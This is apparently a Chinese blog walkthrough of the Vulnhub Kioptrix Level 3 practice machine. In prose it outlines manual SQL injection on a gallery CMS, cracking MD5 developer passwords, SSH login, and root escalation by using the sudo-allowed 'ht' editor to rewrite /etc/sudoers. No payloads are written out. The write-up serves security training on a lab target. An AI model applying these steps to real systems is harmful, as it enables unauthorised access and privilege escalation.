vulnhub-Kioptrix-lv.3-WalkThrough

发表于 2020-03-05 分类于 Vulnhub

Kioptrix Level 3

信息收集

扫80端口

渗透测试

根据提示, 看一下新的gallery cms


这里有个种类选择的按钮, 尝试选择一下
按照id选择, 肯定和数据库有交互,尝试一下sql注入


老规矩, 不使用自动化脚本

发现总共6个字段其中2 ,3 可以回显

发现dev_accounts表, 推测是开发者账号密码, md5解密, 尝试ssh登录

成功登录

发现公司策略文件, ht文件可以sudo执行.

查找ht文件并查看权限, 发现是s权限(Set UID 简称SUID:
即当执行该文件时将具有该文件所有者的权限. )

按f3 然后进入/etc/sudoers 把/bin/bash 加在 loneferret 的那里, Alt+F 保存并退出

至此结束.
